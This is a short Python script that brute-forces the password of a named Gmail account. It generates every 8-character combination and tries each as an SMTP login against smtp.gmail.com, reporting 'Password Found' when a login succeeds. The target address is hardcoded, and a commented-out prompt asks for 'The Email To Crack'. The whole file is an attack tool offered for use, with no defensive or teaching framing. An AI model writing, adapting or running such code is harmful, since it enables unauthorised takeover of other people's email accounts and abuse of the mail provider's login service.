import sys
import smtplib
from itertools import product
string_length = 8
import time
characters = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '1', '2', '3', '4', '5', '6', '7', '8', '9', '0', '!', '@', '#', '$', '%', '^', '&', '*', '(', ')', '_', '-', '+', '=']
#combinations = [''.join(combination) for combination in product(characters, repeat=string_length)]
def generate_combinations(characters, string_length):
    for combination in product(characters, repeat=string_length):
        yield ''.join(combination)
generator = generate_combinations(characters, string_length)
host = 'smtp.gmail.com'
port = 587
user = 'nagarajpalayam2@gmail.com'#input('[+] Enter The Email To Crack : ')
   
try:
    while True:
      combination = next(generator)
      try:
       server = smtplib.SMTP(host, port)
       server.ehlo()
       server.starttls()
       server.login(user, combination)
       print("[+] Password Found Succesfully : " + combination)
       sys.exit(1)
      except :
         print("[-] Password Incorrect : " + combination)
         time.sleep(0.5)

except StopIteration:
    print("All combinations generated.")



#def smtp(host, port, user, password):
    
#main(next(generator))